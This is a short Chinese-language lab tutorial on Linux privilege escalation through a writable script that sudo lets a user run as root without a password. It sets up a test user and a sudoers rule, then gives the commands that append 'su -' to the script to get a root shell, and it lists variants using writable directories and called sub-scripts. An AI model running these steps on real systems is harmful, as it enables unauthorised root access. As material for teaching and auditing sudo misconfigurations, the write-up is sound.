如果sudo脚本由攻击者可控，那会引发提权问题。

# 环境准备

root账户执行以下操作：

```shell
groupadd aplyc1a
useradd -d /home/aplyc1a -m aplyc1a -g aplyc1a -s /bin/bash -p 123456
mkdir -p ~aplyc1a/escal
chown aplyc1a:aplyc1a ~aplyc1a/escal
chmod a+x ~aplyc1a/escal
```

# 脚本配置

```shell
root: echo "aplyc1a ALL=(root) NOPASSWD:/home/aplyc1a/escal/3.sh" >> /etc/sudoers
aplyc1a: echo '#!/bin/bash' >> /home/aplyc1a/escal/3.sh
aplyc1a: echo "ps aux" >> /home/aplyc1a/escal/3.sh
aplyc1a: chmod +x /home/aplyc1a/escal/3.sh
```

# 攻击实施

攻击者攻陷aplyc1a账户后，通过在配置了sudo白名单免密的脚本中夹杂私货达到提权的目的。

```shell
aplyc1a: echo 'whoami' >> /home/aplyc1a/escal/3.sh
aplyc1a: echo 'su -' >> /home/aplyc1a/escal/3.sh
aplyc1a: sudo /home/aplyc1a/escal/3.sh
```

# 其他

1.如果/home/aplyc1a/escal/3.sh属主属组为root，由于/home/aplyc1a/escal/目录有aplyc1a完全可控，仍可通过删掉重新部署的方式达到提权。

```shell
root:chown root:root /home/aplyc1a/escal/3.sh
```

2.如果对某个aplyc1a下的目录配置了sudo，那么可以在该目录下创建脚本，写入恶意提权命令，达到提权。

```shell
root: echo "aplyc1a ALL=(root) NOPASSWD:/home/aplyc1a/escal/" >> /etc/sudoers
```

3.如果有sudo权限的某脚本虽然不可控，但其内部调用的其他脚本aplyc1a可以修改它，则可以通过修改被调用的子脚本达到提权目的。





